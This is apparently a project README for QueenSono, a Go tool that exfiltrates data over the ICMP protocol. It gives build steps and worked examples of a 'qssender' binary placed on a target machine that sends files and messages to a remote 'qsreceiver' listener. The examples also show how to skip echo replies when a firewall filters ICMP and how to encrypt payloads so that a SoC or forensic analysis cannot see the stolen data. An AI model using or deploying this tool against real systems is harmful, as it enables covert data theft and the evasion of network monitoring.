


  <h1 align="center">QueenSono <i> ICMP Data Exfiltration </i></h1>
<h4 align="center"> A Golang Package for Data Exfiltration with ICMP protocol. </h4>
  <p align="center">
  QueenSono tool only relies on the fact that ICMP protocol isn't monitored. It is quite common. It could also been used within a system with basic ICMP inspection (ie. frequency and content length watcher) or to bypass authentication step with captive portal (used by many public Wi-Fi to authenticate users after connecting to the Wi-Fi e.g Airport Wi-Fi). 
  Try to imitate <a href="https://github.com/ytisf/PyExfil">PyExfil</a> (and others) with the idea that the target machine does not necessary have python installed (so provide a binary could be useful)
    <br />
    <br>
    <strong>
    <a href="https://github.com/ariary/QueenSono/blob/main/README.md#install">Install it</a>
    ·
    <a href="https://github.com/ariary/QueenSono/blob/main/README.md#usage">Use it</a>
    ·
    <a href="https://github.com/ariary/QueenSono/blob/main/README.md#notes">Notes</a>
    ·
    <a href="https://github.com/ariary/QueenSono/issues">Request Feature</a>
  </strong>
  </p>
</p>

## Install
 *\> Install the binary from source*
 
Clone the repo and download the dependencies locally:
```    
git clone https://github.com/ariary/QueenSono.git
make before.build
```

 To build the ICMP packet sender `qssender` :

     build.queensono-sender
    

 To build the ICMP packet receiver `qsreceiver` :

     build.queensono-receiver

## Usage

`qssender` is the binary which will send ICMP packet  to the listener , so it is the binary you have to transfer on your target machine. 

`qsreceiver` is the listener on your local machine (or wherever you could receive icmp packet)

All commands and flags of the binaries could be found using `--help`

### Example 1: Send with "ACK" 🔙
*\> In this example we want to send a big file and look after echo reply to ackowledge the reception of the packets (ACK).*

![demo](https://github.com/ariary/QueenSono/blob/main/img/qssono.gif)

On local machine:

    $ qsreceiver receive -l 0.0.0.0 -p -f received_bible.txt

<details>
  <summary><b>Explanation</b></summary>
    <li>
    <code>-l 0.0.0.0</code>listen on all interfaces for ICMP packet
    </li>
    <li>
      <code>-f received_bible.txt</code> save received data in a file
    </li>
    <li><code>-p</code> show a progress bar of received data </li>

</details>


On target machine:

    $ wget https://raw.githubusercontent.com/mxw/grmr/master/src/finaltests/bible.txt #download a huge file (for the example)
    $ qssender send file -d 2 -l 127.0.0.1 -r 10.0.0.92 -s 50000 bible.txt

<details>
  <summary><b>Explanation</b></summary>
    <li>
    <code>send file</code> for sending file (<code>bible.txt</code> is the file in question)
    </li>
    <li>
      <code>-d 2</code> send a packet each 2 seconds
    </li>
    <li><code>-l 127.0.0.1</code> the listening address for <i>echo reply</i> </li>
    <li><code>-r 10.0.0.92</code> the address of my remote machine with <code>qsreceiver</code> listening</li>
    <li><code>-s 50000</code> the data size I want to send in each packet</li>
</details>


### Example 2: Send without "ACK" 🙈
*\> In this example we want to send a message without waiting for echo reply (it could be useful in  case the target firewall filters incoming icmp packet)*

![demo](https://github.com/ariary/QueenSono/blob/main/img/qssono-trunc.gif?raw=true)


On local machine:

    $ qsreceiver receive truncated 1 -l 0.0.0.0
 

<details>
  <summary> <b>Explanation</b></summary>
    <li><code>receive truncated 1</code> does not wait indefinitely if we don't received all the packets. (<code>1</code> is the delay used with <code>qssender</code>)</li>
</details>


On target machine:

    $ qssender send "thisisatest i want to send a string w/o waiting for the echo reply" -d 1 -l 127.0.0.1 -r 10.0.0.190 -s 1 -N
<details>
  <summary><b>Explanation</b></summary>
    <li>
    <code>-N</code> noreply option (don't wait for <i>echo reply</i>)
    </li>
</details>


### Example 3: Send encrypted data 🔒
*\> In this example we want to send an encrypted message. As the command line could be spied on we use asymmetric encryption*

On local machine:

    $ qsreceiver receive -l 0.0.0.0 --encrypt 
    <OUTPUT PUBLIC KEY>
 

<details>
  <summary> <b>Explanation</b></summary>
    <li><code>--encrypt </code> use encryption exchange. It will generate public/private key. The public one will be used by <code>qssender</code> to encrypt data, the private one is used to decrypt it with <code>receiver</code>
</details>


On target machine:

    $ qssender send "don't worry this message was encrypted with the public key. only you could decrypt it" -d 1 -l 127.0.0.1 -r 10.0.0.190 go.mod -s 5 --encrypt <public_key_from_qsreceiver_output>
<details>
  <summary>Explanation</summary>
    <li>
    <code>--encrypt </code> provide key for data encryption. Use the one provided by the <code>qsreceiver</code> command
    </li>
</details>

#### About encryption
RSA encrytion is used to keep data exchanged confidential. It could be useful for example to avoid a SoC to see what data is exchanged (or forensic) w/ basic analysis or simply for privacy.

But it comes with a cost. The choice of asymetric encryption is motivated by the fact that the encryption key is entered on the command line (so it could be retieved easily). Hence, we encrypt data with public key. Like this if someone retrieve the encryption key it will not be possible to decrypt the message. But the public key is smaller than the private one, so it ***encrypt smaller messages***. Also, ***it is computationally expensive***.

Another point, as we want to limit data size/ping request (avoid detection, bug, etc), **use encryption only if needed** ***as the message output-size will (should) always equal the size of the Modulus*** (part of the key) which is big.

### Notes
- only work on Linux  (due to the use of golang net icmp package)
- need `cap_net_raw capabilities`
